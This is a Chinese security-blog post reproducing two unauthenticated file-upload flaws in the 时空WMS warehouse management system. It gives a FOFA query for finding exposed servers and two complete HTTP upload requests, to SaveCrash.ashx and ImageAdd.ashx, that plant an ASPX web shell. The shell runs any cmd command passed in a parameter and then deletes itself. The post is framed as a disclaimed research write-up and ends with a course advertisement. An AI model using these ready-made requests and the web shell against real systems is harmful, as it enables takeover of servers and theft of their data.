#  时空WMS-仓储精细化管理系统两处文件上传致RCE漏洞复现   
原创 红岸基地赵小龙  暗影网安实验室   2024-12-02 09:25  
  
## 产品简介  
  
  
时空WMS-仓储精细化,管理系统Q是一款高效、智能的仓储管理工具，旨在帮助企业实现仓库的精细化管理和高效运营。由郑州时空软件开发，专注于以数字化、智能化推动企业进步。该系统基于先进的仓储管理理念和技术架构，融合了物联网、移动互联等前沿技术，实现了对仓库内物资的全面、精准、高效管理、系统话用千各类仓储物流企业，包括电商仓储、第一方物流、生产仓储等多个领域。通过使用该系统，企业可以实现对仓库内物资的全面掌控和高效管理，提高库存周转率，降低库存成本，提升企业竞争优势。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB7crz6fpGEXLuMtzpB5QNxpsVicEDePnqwbZDYpbjMasRhDZxZdKcSlibA/640?wx_fmt=png&from=appmsg "")  
  
  
## 漏洞概述  
  
  
时空WMS-仓储精细化管理系统 SaveCrash.ashx 接口存在文件上传漏洞，电子资料管理系统 /MenulmageManqerlmaaeUpload.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web服务器。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**FOFA**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
  
```
body="SKControlKLForJson.ashx"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB79KEPk90BEWsgNX91rs3rEYhhpHZzyicCNhbqaziat8E0Az7DHEAexvOg/640?wx_fmt=png&from=appmsg "")  
## SaveCrash.ashx漏洞复现  
```
POST /crash/SaveCrash.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip
 
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: text/plain
 
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB7wticFvB0SQzjSez5QsamibWjtldDLmYSPbPWmHbWax3KEyhiam8nuptAg/640?wx_fmt=png&from=appmsg "")  
  
RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB7XuaVjdPjIp7AGudpCcib5PMNLCKnht8hd6nYibV2SlETyPeDqwGsblHQ/640?wx_fmt=png&from=appmsg "")  
  
## ImageAdd.ashx漏洞复现  
```
POST /ImageUpload/ImageAdd.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip
 
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: text/plain
 
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB79eT0TyiaU4EO7FNh9cGXPee3gSlvUXBiaKKG4zotq6qe8G2W5L9KRBhA/640?wx_fmt=png&from=appmsg "")  
  
RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB7oCGrD9tw4yRwaKywvF7NYic7tMgDcg1HSdCcibxHCibE4n5Pyhwm7ngqw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**免责声明**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
文章所涉及内容，仅供安全研究与教学之用，由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。  
  
  
大家对于网络安全感兴趣的话，不妨来加一下我们的老师，我们会定期在给大家分享  
**渗透****工具**和  
**实战****文****章**，还会有  
**渗透公开课**可以试听！  
  
**扫码添加，提升自己！**  
  
**👇👇👇**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/XvnzjMsl2uqSvZE6x25icBxYJVFOCI9lDasEWqq2rXaaHicvykJsBK94cBdfxibU6fOQ2iaTJ0IKoVMmiaFbIAjJz4A/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
后续一些打击犯罪文章会在下方公众号发布  
  
  
